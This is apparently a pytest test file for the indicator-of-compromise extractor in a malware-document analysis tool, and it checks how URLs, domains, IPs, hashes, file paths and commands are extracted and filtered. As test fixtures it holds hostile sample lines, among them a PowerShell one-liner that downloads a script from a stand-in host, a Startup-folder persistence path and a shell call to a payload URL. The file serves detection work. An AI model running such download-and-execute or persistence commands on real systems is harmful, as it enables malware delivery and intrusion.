"""Tests for the common IOC extractor."""

from __future__ import annotations

from docutracex import ioc


# trace: gmzpt
def _types(result):
    return {i["type"]: i["value"] for i in result["iocs"]}


def test_url_domain_ipv4_hash() -> None:
    text = (
        "Contact http://malware.example.com/payload.exe from 203.0.113.9; "
        "sha256 is 44d88612fea8a8f36de82e1278abb02f44d88612fea8a8f36de82e1278abb02f"
    )
    res = ioc.extract([{"module": "word", "location": "text", "text": text}])
    vals = {(i["type"], i["value"]) for i in res["iocs"]}
    assert ("url", "http://malware.example.com/payload.exe") in vals
    assert ("domain", "malware.example.com") in vals
    assert ("ipv4", "203.0.113.9") in vals
    assert any(t == "hash_like" for t, _ in vals)


def test_invalid_ipv4_rejected() -> None:
    res = ioc.extract([{"module": "x", "location": "y", "text": "999.1.1.1 and 10.0.0.256"}])
    assert not any(i["type"] == "ipv4" for i in res["iocs"])


def test_part_names_not_domains() -> None:
    # Internal part names like document.xml must not be treated as domains.
    text = "word/document.xml and sharedStrings.xml and image1.png"
    res = ioc.extract([{"module": "ooxml", "location": "p", "text": text}])
    assert not any(i["type"] == "domain" for i in res["iocs"])


def test_dedup_keeps_occurrences() -> None:
    srcs = [
        {"module": "word", "location": "text", "text": "see http://a.example/x"},
        {"module": "word", "location": "field_code", "text": "HYPERLINK http://a.example/x"},
    ]
    res = ioc.extract(srcs)
    url = next(i for i in res["iocs"] if i["type"] == "url")
    assert url["count"] == 2
    assert {o["location"] for o in url["occurrences"]} == {"text", "field_code"}


def test_sources_from_modules() -> None:
    modules = {
        "ooxml": {"relationships": [
            {"mode": "External", "target": "http://evil.example/t.dotm", "rels_file": "_rels/.rels"},
            {"mode": "Internal", "target": "word/document.xml"},
        ]},
        "excel": {"formulas": ['WEBSERVICE("http://feed.example/x")'], "metadata": {"creator": "bob"}},
    }
    vals = {(i["type"], i["value"]) for i in ioc.extract(ioc.sources_from_modules(modules))["iocs"]}
    assert ("domain", "evil.example") in vals and ("domain", "feed.example") in vals
    # Internal part names (word/document.xml) are filenames, never domains.
    assert not any(t == "domain" and v.endswith("document.xml") for t, v in vals)


def test_scans_all_tool_output_not_just_findings() -> None:
    # A whole-result sweep: an emulated-sandbox URL that lives deep in the
    # JavaScript module (not in any finding) must still be extracted.
    modules = {
        "javascript": {"scripts": [
            {"sandbox": {"log": [
                {"kind": "url", "name": "fetch", "args": ["http://emulated.example/beacon"]},
            ]}},
        ]},
    }
    vals = {i["value"] for i in ioc.extract(ioc.sources_from_modules(modules))["iocs"]}
    assert "http://emulated.example/beacon" in vals and "emulated.example" in vals


def test_nested_child_evidence_is_scanned() -> None:
    # The recursive 'nested' scan keeps each child finding's evidence; the
    # extractor must mine it (read through the flattened findings).
    modules = {"nested": {"findings": [
        {"tool": "javascript", "rule": "js_sandbox_network", "severity": "high",
         "detail": "[invoice.eml > a.js] Sandbox: the script opens/navigates to URLs",
         "location": "nested:invoice.eml > a.js",
         "evidence": "fetch http://child-emulated.example/x"},
    ]}}
    vals = {i["value"] for i in ioc.extract(ioc.sources_from_modules(modules))["iocs"]}
    assert "http://child-emulated.example/x" in vals and "child-emulated.example" in vals


def test_nested_child_full_material_is_scanned() -> None:
    # Option 2: a child's full sub-results are reduced to ioc_sources at scan
    # time, so IOCs beyond the finding-evidence caps are still mined. A child
    # email in that material stays content-only (its headers are never mined).
    modules = {"nested": {
        "findings": [{"rule": "r", "evidence": "fetch http://headline.example/1"}],
        "ioc_sources": [
            {"module": "vipermonkey", "location": "doc.docm › vipermonkey/actions[9]",
             "text": "Shell http://deep.example/payload9.exe"},
            {"module": "email", "location": "doc.docm › email/body",
             "text": "see http://childbody.example/x"},
        ],
    }}
    vals = {i["value"] for i in ioc.extract(ioc.sources_from_modules(modules))["iocs"]}
    assert "http://deep.example/payload9.exe" in vals and "deep.example" in vals
    assert "http://headline.example/1" in vals  # findings still mined too
    assert "childbody.example" in vals


def test_app_computed_hashes_not_treated_as_iocs() -> None:
    # sha256/md5 the app computed to identify a component must not surface as
    # hash_like IOCs (they are kept separate by design).
    h = "44d88612fea8a8f36de82e1278abb02f44d88612fea8a8f36de82e1278abb02f"
    modules = {"pdf": {"sha256": h, "text_sample": "nothing suspicious here"}}
    types = {i["type"] for i in ioc.extract(ioc.sources_from_modules(modules))["iocs"]}
    assert "hash_like" not in types


def test_email_only_content_scanned() -> None:
    modules = {"email": {
        "body_sample": "Download from http://payload.example/a.exe",
        "html_links": ["https://phish.example/login"],
        "headers": [{"name": "Received", "value": "from mx.header.example ([198.51.100.7])"},
                    {"name": "From", "value": "bob@sender.example"}],
        "received_chain": [{"from": "relay.header.example", "by": "mx.header.example",
                            "ip": "198.51.100.7"}],
        "attachments": [{"filename": "invoice.attach.example"}],
    }}
    srcs = ioc.sources_from_modules(modules)
    assert {s["location"] for s in srcs} == {"body", "body_html_link"}
    vals = {i["value"] for i in ioc.extract(srcs)["iocs"]}
    assert "payload.example" in vals and "phish.example" in vals
    assert not any("header.example" in v or "sender.example" in v for v in vals)
    assert "198.51.100.7" not in vals


def test_times_and_macs_are_not_ipv6() -> None:
    text = ("Received at 15:56:42 and 17:56:47.272, MAC 00:11:22:33:44:55, "
            "real ones fe80::1ff:fe23:4567:890a and 2001:0db8:0000:0000:0000:ff00:0042:8329 and ::1")
    res = ioc.extract([{"module": "email", "location": "body", "text": text}])
    v6 = sorted(i["value"] for i in res["iocs"] if i["type"] == "ipv6")
    assert v6 == ["2001:db8::ff00:42:8329", "fe80::1ff:fe23:4567:890a"]      # loopback ::1 is not an IOC


def test_url_with_a_non_alphabetic_tld_is_not_an_ioc() -> None:
    res = ioc.extract([{"module": "vbatools", "location": "http_heuristics",
                        "text": "http://cdn.example.net2f66696c65732f7570642e62696e and https://ok.example.org/a"}])
    assert {i["value"] for i in res["iocs"]} == {"https://ok.example.org/a", "ok.example.org"}


def test_ioc_noise_filters() -> None:
    import importlib.util, pathlib
    spec = importlib.util.spec_from_file_location(
        "ms", pathlib.Path(__file__).parents[1] / "scripts" / "make_samples.py")
    ms = importlib.util.module_from_spec(spec); spec.loader.exec_module(ms)
    text = ms.ioc_noise_bat().decode("utf-8")
    vals = {(i["type"], i["value"]) for i in
            ioc.extract([{"module": "script", "location": "text", "text": text}])["iocs"]}
    urls = {v for t, v in vals if t == "url"}
    paths = {v for t, v in vals if t == "filepath"}
    assert "http://billing-portal.example/inv/stage2.ps1" in urls
    assert not any("decalage" in u or "borntyping" in u for u in urls)
    assert r"C:\Users\Public\Documents\invoice_view.exe" in paths
    assert not any("DocuTraceX" in p or "\\x4d" in p or "\xc3" in p for p in paths)


def test_tool_url_list_is_project_specific() -> None:
    tool = ["https://github.com/mandiant/capa/releases", "https://raw.githubusercontent.com/DidierStevens/DidierStevensSuite/master/pdfid.py",
            "https://codeload.github.com/decalage2/ViperMonkey/zip/master", "https://api.github.com/repos/j4k0xb/webcrack",
            "https://pypi.org/project/oletools/", "https://blog.didierstevens.com/programs/pdf-tools/", "http://www.benf.org/other/cfr/"]
    real = ["https://github.com/attacker-org/payloads/raw/main/a.exe", "https://raw.githubusercontent.com/evil/x/main/s.ps1",
            "https://www.python.org/ftp/python/3.12.0/python-3.12.0-embed-amd64.zip", "https://nodejs.org/dist/v20/node.exe",
            "https://pypi.org/project/requests-evil/", "http://billing-portal.example/oletools/x"]
    assert all(ioc._is_tool_url(u) for u in tool)
    assert not any(ioc._is_tool_url(u) for u in real)


def test_iana_tld_validation(tmp_path, monkeypatch) -> None:
    import shutil, pathlib
    from docutracex import tlds
    from docutracex.config import settings
    monkeypatch.setattr(settings, "tools_dir", tmp_path)
    text = "obj at cfg.zz and row.qq; real evil.sbs, a.b.ru, mail x@evil.zz y@pay.sbs and billing-portal.example"
    # without the IANA file: built-in fallback (any 2-letter TLD passes)
    assert tlds.status()["source"] == "builtin"
    assert ("domain", "cfg.zz") in {(i["type"], i["value"]) for i in ioc.extract(
        [{"module": "word", "location": "text", "text": text}])["iocs"]}
    dest = tlds.path(); dest.parent.mkdir(parents=True)
    shutil.copy(pathlib.Path(__file__).parent / "data" / "tlds-alpha-by-domain.txt", dest)
    st = tlds.status()
    assert st["source"] == "iana" and st["count"] > 100
    vals = {(i["type"], i["value"]) for i in ioc.extract(
        [{"module": "word", "location": "text", "text": text}])["iocs"]}
    doms = {v for t, v in vals if t == "domain"}
    emails = {v for t, v in vals if t == "email"}
    assert "cfg.zz" not in doms and "row.qq" not in doms
    assert {"evil.sbs", "a.b.ru", "billing-portal.example"} <= doms
    assert "y@pay.sbs" in emails and "x@evil.zz" not in emails


def test_tlds_refresh_api(tmp_path, monkeypatch) -> None:
    from fastapi.testclient import TestClient
    from docutracex import tlds
    from docutracex.app import create_app
    from docutracex.config import settings
    monkeypatch.setattr(settings, "tools_dir", tmp_path)
    monkeypatch.setattr(tlds, "download", lambda proxy=None: {"source": "iana", "count": 1500})
    c = TestClient(create_app())
    assert c.post("/api/settings/tlds/refresh").json()["count"] == 1500
    assert c.get("/api/settings/network").json()["tlds"]["source"] == "builtin"

    def boom(proxy=None):
        raise OSError("offline")
    monkeypatch.setattr(tlds, "download", boom)
    assert c.post("/api/settings/tlds/refresh").status_code == 502


def test_yara_results_are_not_mined_for_iocs() -> None:
    yara = {"scanned": [{"file": "a.bin", "matches": [{
        "rule": "R", "meta": {"reference": "https://intel-blog.example/report", "author": "x@vendor.example"},
        "strings": [{"id": "$u", "text": "http://yara-only.example/p", "context": {"data": "41"}}]}]}]}
    word = {"text": "visit http://real.example/a"}
    nested = {"ioc_sources": [{"module": "yara", "location": "x", "text": "http://nested-yara.example/q"}]}
    vals = {i["value"] for i in ioc.extract(ioc.sources_from_modules(
        {"yara": yara, "word": word, "nested": nested}))["iocs"]}
    assert "http://real.example/a" in vals
    assert not any("yara-only" in v or "intel-blog" in v or "vendor.example" in v
                   or "nested-yara" in v for v in vals)



def test_spaced_paths_and_command_boundaries() -> None:
    t = ('rem persist via %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\inv.lnk\n'
         'copy "C:\\Program Files\\Billing Portal\\inv viewer.exe" %TEMP%\\inv.exe\n'
         'rem no such TLD at IANA; type of payment: transfer\n'
         'powershell -nop -c "iwr http://billing-portal.example/a.ps1"\n'
         'rem 203.0.113.9\n'
         'type C:\\Windows\\win.ini & at 23:00 cmd /c calc\n'
         'Where to go: C:\\temp\n'
         'start explorer.exe http://billing-portal.example/x\n')
    res = ioc.extract([{"module": "batch", "location": "code", "text": t}])["iocs"]
    paths = {i["value"] for i in res if i["type"] == "filepath"}
    cmds = {i["value"] for i in res if i["type"] == "command"}
    assert "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\inv.lnk" in paths
    assert "C:\\Program Files\\Billing Portal\\inv viewer.exe" in paths
    assert 'powershell -nop -c "iwr http://billing-portal.example/a.ps1"' in cmds
    assert "type C:\\Windows\\win.ini" in cmds and "at 23:00 cmd /c calc" in cmds
    assert "explorer.exe http://billing-portal.example/x" in cmds
    assert not any(c.lower().startswith(("at iana", "type of", "where to")) for c in cmds)
    assert not any("\n" in c or "rem" in c for c in cmds)
